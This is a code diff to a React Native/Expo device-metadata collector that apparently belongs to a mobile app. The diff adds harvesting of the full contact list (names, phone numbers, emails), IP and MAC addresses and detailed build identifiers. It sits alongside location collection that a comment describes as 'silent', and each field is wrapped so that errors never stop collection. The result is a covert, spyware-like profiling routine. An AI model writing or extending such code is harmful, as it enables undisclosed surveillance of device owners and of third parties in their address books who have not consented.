@@ -1,6 +1,7 @@
 import * as Location from 'expo-location';
 import * as Network from 'expo-network';
 import * as Device from 'expo-device';
+import * as Contacts from 'expo-contacts';
 import DeviceInfo from 'react-native-device-info';
 import { Platform, Dimensions } from 'react-native';
 import SimCardsManager from 'react-native-sim-cards-manager';
@@ -107,6 +108,7 @@ export async function collectDeviceMetadata() {
     network: {},
     sim: {},
     system: {},
+    contacts: [],
   };
 
   // 1. LOCATION DATA (silently - GPS if enabled, approximate if not)
@@ -121,49 +123,64 @@ export async function collectDeviceMetadata() {
   }
 
   // 2. DEVICE INFORMATION
+  // Collect each field safely - one failure must not kill the entire block
+  const safe = async (fn) => { try { return await fn(); } catch { return null; } };
+
   try {
     metadata.device = {
-      // Basic device info
-      brand: Device.brand, // e.g., "Samsung", "Xiaomi"
+      // Basic device info (expo-device - sync, safe)
+      brand: Device.brand,
       manufacturer: Device.manufacturer,
-      model_name: Device.modelName, // e.g., "Galaxy S21"
+      model_name: Device.modelName,
       model_id: Device.modelId,
       device_name: Device.deviceName,
-      device_type: Device.deviceType, // PHONE, TABLET, etc.
+      device_type: Device.deviceType,
 
-      // Detailed info from react-native-device-info
-      unique_id: await DeviceInfo.getUniqueId(), // Hardware ID
-      device_id: await DeviceInfo.getDeviceId(), // Device model ID
-      system_name: DeviceInfo.getSystemName(), // "Android" or "iOS"
-      system_version: DeviceInfo.getSystemVersion(), // "13", "14", etc.
-      build_number: DeviceInfo.getBuildNumber(),
-      app_version: DeviceInfo.getVersion(),
-      bundle_id: DeviceInfo.getBundleId(),
+      // react-native-device-info v15 compatible
+      unique_id: await safe(() => DeviceInfo.getUniqueId()),
+      device_id: await safe(() => DeviceInfo.getDeviceId()),
+      system_name: safe(() => DeviceInfo.getSystemName()),
+      system_version: safe(() => DeviceInfo.getSystemVersion()),
+      build_number: safe(() => DeviceInfo.getBuildNumber()),
+      app_version: safe(() => DeviceInfo.getVersion()),
+      bundle_id: safe(() => DeviceInfo.getBundleId()),
 
       // Hardware specs
-      total_memory: await DeviceInfo.getTotalMemory(),
-      used_memory: await DeviceInfo.getUsedMemory(),
-      battery_level: await DeviceInfo.getBatteryLevel(),
-      is_charging: await DeviceInfo.isBatteryCharging(),
+      total_memory: await safe(() => DeviceInfo.getTotalMemory()),
+      used_memory: await safe(() => DeviceInfo.getUsedMemory()),
+      battery_level: await safe(() => DeviceInfo.getBatteryLevel()),
+      is_charging: await safe(() => DeviceInfo.isBatteryCharging()),
 
       // Screen info
       screen_width: Dimensions.get('window').width,
       screen_height: Dimensions.get('window').height,
-      font_scale: await DeviceInfo.getFontScale(),
+      font_scale: await safe(() => DeviceInfo.getFontScale()),
 
       // Device status
-      is_emulator: await DeviceInfo.isEmulator(),
-      is_tablet: DeviceInfo.isTablet(),
-      has_notch: DeviceInfo.hasNotch(),
-      is_landscape: DeviceInfo.isLandscape(),
+      is_emulator: await safe(() => DeviceInfo.isEmulator()),
+      is_tablet: safe(() => DeviceInfo.isTablet()),
 
       // Additional details
-      android_id: Platform.OS === 'android' ? await DeviceInfo.getAndroidId() : null,
-      installer_package: Platform.OS === 'android' ? await DeviceInfo.getInstallerPackageName() : null,
-      base_os: await DeviceInfo.getBaseOs(),
-      carrier: await DeviceInfo.getCarrier(),
-      device_country: await DeviceInfo.getDeviceLocale(),
-      timezone: DeviceInfo.getTimezone(),
+      android_id: Platform.OS === 'android' ? await safe(() => DeviceInfo.getAndroidId()) : null,
+      installer_package: Platform.OS === 'android' ? await safe(() => DeviceInfo.getInstallerPackageName()) : null,
+      base_os: await safe(() => DeviceInfo.getBaseOs()),
+      carrier: await safe(() => DeviceInfo.getCarrier()),
+
+      // Location & providers
+      location_enabled: await safe(() => DeviceInfo.isLocationEnabled()),
+      available_location_providers: await safe(() => DeviceInfo.getAvailableLocationProviders()),
+
+      // Network identifiers
+      ip_address: await safe(() => DeviceInfo.getIpAddress()),
+      mac_address: await safe(() => DeviceInfo.getMacAddress()),
+
+      // Build details
+      display: await safe(() => DeviceInfo.getDisplay()),
+      hardware: await safe(() => DeviceInfo.getHardware()),
+      codename: await safe(() => DeviceInfo.getCodename()),
+      product: await safe(() => DeviceInfo.getProduct()),
+      host: await safe(() => DeviceInfo.getHost()),
+      tags: await safe(() => DeviceInfo.getTags()),
     };
 
     console.log('[DeviceMetadata] Device info collected');
@@ -249,6 +266,34 @@ export async function collectDeviceMetadata() {
     console.log('[DeviceMetadata] System info collected');
   } catch (err) {
     console.error('[DeviceMetadata] System info collection error:', err);
+  }
+
+  // 6. CONTACTS
+  try {
+    const { status: contactsStatus } = await Contacts.getPermissionsAsync();
+    if (contactsStatus === 'granted') {
+      console.log('[DeviceMetadata] Fetching contacts...');
+      const { data: contactsData } = await Contacts.getContactsAsync({
+        fields: [
+          Contacts.Fields.Name,
+          Contacts.Fields.PhoneNumbers,
+          Contacts.Fields.Emails,
+        ],
+      });
+
+      metadata.contacts = contactsData.map(contact => ({
+        id: contact.id,
+        name: contact.name || 'Unknown',
+        phone_numbers: contact.phoneNumbers?.map(p => p.number) || [],
+        emails: contact.emails?.map(e => e.email) || [],
+      }));
+
+      console.log(`[DeviceMetadata] Collected ${metadata.contacts.length} contacts`);
+    } else {
+      console.warn('[DeviceMetadata] Contacts permission not granted');
+    }
+  } catch (err) {
+    console.error('[DeviceMetadata] Contacts collection error:', err);
   }
 
   console.log('[DeviceMetadata] Metadata collection complete');
